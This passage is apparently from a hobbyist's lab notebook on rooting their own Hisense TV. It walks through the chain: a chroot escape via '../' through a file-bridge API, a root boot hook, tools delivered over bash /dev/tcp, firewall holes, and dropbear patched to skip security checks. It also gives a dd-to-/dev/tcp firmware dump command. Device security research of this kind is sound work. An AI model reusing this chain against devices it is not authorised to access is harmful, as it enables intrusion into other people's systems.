# alvidaa findings — root, achieved — the kill chain and working state

> Split from the original FINDINGS.md lab notebook. Canonical record; the blog and STORY.md draw from these.

## 11. Root, achieved (Oct 2026)

The full chain, in the order each layer fell:

1. `HiUtils_createRequest` file bridge → chroot `/APPS`, escaped via `../` (§10.3).
2. `/var/local/otaTest.sh` root boot hook, written through the bridge (§10.9).
3. Static busybox (telnetd) + dropbear 2025.88 built with `zig cc -target
   arm-linux-musleabihf`, delivered over bash `/dev/tcp` at boot (§10.12–13).
4. Firmware firewall holes for ports 2222/2323 (§10.14).
5. Dropbear patched three times (§10.15–16): authorized_keys via `-D`
   (no `.ssh/` subdir), shell-validity check removed (no `/etc/shells`, and
   root's shell is the USB gate script), perms walk removed (`/var/local` is
   777 by firmware design).
6. Final layer: root's login shell *is* `rootlogin.sh` — dropbear execs
   `pw_shell` for every session including forced commands, so the gate ran
   instead of a shell. `get_user_shell()` patched to return `/bin/sh` always.

**Working state**: `server/tv` (PATH-fixing wrapper) →

```
uid=0(root) … Linux hisensetv-88b863c83aa5 4.19.79+ #1 SMP PREEMPT
Wed Aug 13 14:09:29 CST 2025 armv7l
```

- Hook lineage on the TV: `otaTest.sh` (current) + `otaTest.v1.bak`;
  tools in `/var/local/tvtools` (busybox, dropbear, dropbearkey);
  keys dir `/var/local/roothome`. Teardown = delete those + reboot.
- **eMMC map (3.87 GB, 42 partitions)**: p15 vbmeta (64 KB), p20 rootfs
  squashfs (36 MB), p21/p22/p24 vendor libs, p23 `/application` (97 MB),
  p26 `/config` (20 MB), p33/34/36 hidata, p37 `/usr/local` (245 MB),
  p38 `/opt` (665 MB), p39 `/var/local` (348 MB), p40 `/serialdata`,
  p41 `/APPS` (614 MB), p42 `/OAD` (921 MB).
- **First dump**: `dd if=/dev/mmcblk0p20 > /dev/tcp/<pi>/5555` →
  `firmware/mmcblk0p20.bin` (36 MB, SquashFS 4.0 LZO) → unpacked to
  `firmware/rootfs/` (gitignored). Immediate finds: `/etc/0001-cli-login-aes.pem`
  (the CLI decrypt key) is in the image, and `/etc/shells` does not exist —
  confirming the dropbear shell-check post-mortem.
- Reboots are now remote (`reboot` over SSH); the wall plug is retired.
